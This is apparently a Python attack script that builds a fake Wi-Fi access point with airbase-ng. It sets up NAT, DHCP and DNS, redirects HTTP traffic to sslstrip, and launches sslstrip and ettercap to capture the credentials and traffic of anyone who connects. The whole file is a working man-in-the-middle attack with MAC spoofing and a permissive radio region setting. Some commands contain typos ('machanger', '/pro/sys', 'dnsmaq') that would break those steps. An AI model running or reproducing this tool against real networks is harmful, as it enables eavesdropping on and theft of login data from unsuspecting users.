import os
import time

os.system("clear")

# Ask for Interfaces
interfaceAP = input("\nInterface for AP? --> ")
interfaceInet = input("\nInterface connected to Internet? --> ")

def cleanTroubles(): # Kill conflictive proceses!
  os.system("clear")
  print("Stopping conflictives services...")
  time.sleep(1)
  os.system("clear")
  os.system("killall wpa_supplicant") # Kill wpa_suppliant process.
  os.system("killall dhclient") # Kill dhclient process.
  os.system("/etc/init.d/network-manager stop") # Stop Network Manager service.
  os.system("clear")
  print("Ok, done!")
  time.sleep(1)
  os.system("clear")

def interfaceConf(): # Configure interface!
  os.system("clear")
  print("Configuring interface...")
  time.sleep(1)
  os.system("clear")
  os.system("ifconfig " + interfaceAP + " down") # Turn off interface.
  os.system("machanger -r " + interfaceAP) # Change MAC to a random one.
  os.system("iw reg set BO") # Set interface adaptor's region to bolibia (permissiver).
  os.system("airmon-ng start " + interfaceAP) # Prepeare interface.
  os.system("clear")
  print("Ok, done!")
  time.sleep(1)
  os.system("clear")

def startAP(): # Start AP!
  os.system("clear")
  print("Starting AP...")
  time.sleep(1)
  os.system("clear")
  os.system("xterm -e airbase-ng -c6 -P -C20 -y -v mon0 &") # Start AP
  os.system("clear")
  print("Ok, done!")
  time.sleep(1)
  os.system("clear")

def iptables(): # Configure IPtables!
  os.system("clear")
  print("Configuratting IPtables...")
  time.sleep(1)
  os.system("clear")
  os.system("iptables --flush") # Erase previous configuration.
  os.system("iptables --table nat --flush") # Erase previous configuration.
  os.system("iptables --delete-chain") # Erase previous configuration.
  os.system("iptables --table nat --delete-chain") # Erase previous configuration.
  os.system("echo '1' > /pro/sys/net/ipv4/ip_forward") # Activate IP forwarding.
  os.system("ifconfig at0 up") # Start at0 interface.
  os.system("ifconfig at0 10.0.0.1 netmask 255.255.255.0") # Configure Interface.
  os.system("route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1") # Set 10.0.0.1 (our IP) as gateway.
  os.system("iptables -P FORWARD ACCEPT") # Accept IP forwarding on iptables.
  os.system("iptables -t nat -A POSTROUTING -o " + interfaceInet + " -j MASQUERADE") # Redirect traffic to the interface connected to internet.
  os.system("iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000") # Redirect all tcp data of port 80 to port 10000 (sslstrip).
  os.system("clear")
  print("Ok, done!")
  time.sleep(1)
  os.system("clear")

def dhcpStart(): # Start DHCP server!
  os.system("clear")
  print("Launching DHCP server...")
  time.sleep(1)
  os.system("clear")
  os.system("dhcpd -cf config/dhcpd.conf -f -d") # Launch DHCP server
  print("Ok, done!")
  time.sleep(1)
  os.system("clear")

def dnsStart(): # Start DNS server!
  os.system("clear")
  print("Launching DNS server...")
  time.sleep(1)
  os.system("clear")
  os.system("dnsmaq -k") # Launch DNS server
  os.system("clear")
  print("Ok, done!")
  time.sleep(1)
  os.system("clear")

def attack(): # Launch Attack!!!
  os.system("clear")
  print("Everything is done, FakeAP is prepeared!")
  proceed = input("\nAttack?(y/n) -->")
  if proceed == "y":
    os.system("clear")
    print("Launching Sslstrip...")
    time.sleep(0.7)
    os.system("clear")
    print("\n\n\n\t\t\t\t3")
    time.sleep(1)
    os.system("clear")
    print("\n\n\n\t\t\t\t2")
    time.sleep(1)
    os.system("clear")
    print("\n\n\n\t\t\t\t1")
    time.sleep(1)
    os.system("clear")
    print("Launched!  (Result on captures/capture.txt)")
    os.system("xterm -e sslstrip -a -w captures/capture.txt &") # Launch Sslstrip!
    os.system("xterm -e ettercap -p -u -T -q -i at0 &") # Launch Ettercap
  elif proceed == "n":
    os.system("clear")
    print("Aborted!")
    time.sleep(1)
    os.system("clear")
    print("Back to menu...")
    time.sleep(1)
    os.system("clear")
    os.system("python main.py")
  else:
    os.system("clear")
    print("Yes(y) or No(n).")
    time.sleep(1)
    os.system("clear")
    attack()

def noroot(): # noRoot
  os.system("clear")
  print("RUN AS ROOT!")
  time.sleep(2)
  exit()

def main(): # Main Window
  os.system("clear")
  print("We are going to create the AP.")
  accept = input("Continue?(y/n) --> ")
  if accept == "y":
    cleanTroubles()
    interfaceConf()
    startAP()
    iptables()
    dhcpStart()
    dnsStart()
    attack()
  elif accept == "n":
    os.system("clear")
    print("Aborted!")
    time.sleep(1)
    os.system("clear")
    print("Back to menu...")
    time.sleep(1)
    os.system("clear")
    os.system("python main.py")
  else:
    os.system("clear")
    print("Yes(y) or No(n).")
    time.sleep(1)
    os.system("clear")
    main()

# Root verification
root = os.geteuid()
if root == 0:
  main()
else:
  noroot()
